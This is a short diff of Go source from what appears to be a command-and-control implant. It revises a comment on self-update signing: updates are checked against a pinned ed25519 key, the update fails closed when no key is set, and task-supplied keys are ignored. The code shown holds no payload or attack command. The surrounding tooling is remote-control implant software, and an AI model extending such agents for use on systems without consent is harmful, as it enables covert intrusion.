@@ -65,9 +65,11 @@ func uninstallSelf() (string, error) {
 // updatePinnedPubKeyHex is the compile-time trust root for self-updates. When
 // non-empty, self_update verifies ONLY against this ed25519 public key and
 // ignores any key supplied in the task — so an operator (or anyone able to
-// issue a task) cannot sign and execute an arbitrary binary. Build pipelines
-// should stamp this via -ldflags so every implant trusts only the vendor key.
-// When empty, the task-supplied key is used (legacy behavior; logged).
+// issue a task) cannot sign and execute an arbitrary binary. buildLdflags
+// stamps this at generate time; config_push with update_pub_key can also pin
+// it at runtime (persisted to update.key). When empty, self_update refuses
+// (fail closed) until a key is pushed — task-supplied public_key fields are
+// always ignored.
 var updatePinnedPubKeyHex = ""
 
 // verifyUpdateSignature decodes an ed25519 public key (hex) and checks the
